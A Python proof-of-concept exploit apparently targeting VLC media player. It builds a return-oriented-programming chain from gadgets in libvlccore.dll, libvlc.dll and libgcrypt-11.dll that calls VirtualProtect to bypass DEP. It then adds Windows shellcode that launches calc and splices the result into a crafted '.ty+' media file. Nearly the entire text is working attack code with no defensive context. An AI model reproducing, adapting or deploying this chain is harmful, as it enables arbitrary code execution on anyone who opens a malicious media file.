import os
import struct

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x6a5572a2,  # POP ECX # XOR EDX,EDX # MOV EAX,EDX # POP EBX # POP ESI # POP EDI # POP EBP # RETN [libvlccore.dll] 
      0x0040588d,  # &Writable location [libvlc.dll]
      0x00000201,  # 0x00000201-> ebx
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x10022bcc,  # POP EBP # RETN [libgcrypt-11.dll]
      0x6a5b1663,  # POP EDX # RETN [libvlccore.dll] 
      0x00000040,  # 0x00000040-> edx
      0x6a55b71d,  # POP EDI # RETN [libvlccore.dll] 
      0x6a56600d,  # RETN (ROP NOP) [libvlccore.dll]
      0x6a308048,  # POP ESI # RETN [libvlc.dll] 
      0x1001e444,  # JMP [EAX] [libgcrypt-11.dll]
      0x6a314ae2,  # POP EAX # RETN [libvlc.dll] 
      0x100452dc,  # ptr to &VirtualProtect() [IAT libgcrypt-11.dll]
      0x6a314b42,  # PUSHAD # RETN [libvlc.dll] 
      0x6a314b52,  # ptr to 'push esp # ret ' [libvlc.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
	
rop= create_rop_chain()
shellcode =("\x31\xdb\x64\x8b\x7b\x30\x8b" 
			"\x7f\x0c\x8b\x7f\x1c\x8b\x47" 
			"\x08\x8b\x77\x20\x8b\x3f\x80" 
			"\x7e\x0c\x33\x75\xf2\x89\xc7" 
			"\x03\x78\x3c\x8b\x57\x78\x01" 
			"\xc2\x8b\x7a\x20\x01\xc7\x89"
			"\xdd\x8b\x34\xaf\x01\xc6\x45"
			"\x81\x3e\x43\x72\x65\x61\x75"
			"\xf2\x81\x7e\x08\x6f\x63\x65"
			"\x73\x75\xe9\x8b\x7a\x24\x01"
			"\xc7\x66\x8b\x2c\x6f\x8b\x7a"
			"\x1c\x01\xc7\x8b\x7c\xaf\xfc"
			"\x01\xc7\x89\xd9\xb1\xff\x53"
			"\xe2\xfd\x68\x63\x61\x6c\x63"
			"\x89\xe2\x52\x52\x53\x53\x53"
			"\x53\x53\x53\x52\x53\xff\xd7")
a=open('POC.ty+','rb')
st=a.read()
a.close()
fruta = rop + shellcode + (220 -len(rop + shellcode)) *("A")
st= st.replace(220 * "\x90", fruta)
b=open('POCFINAL.ty+', 'wb')
b.write(st)
b.close()


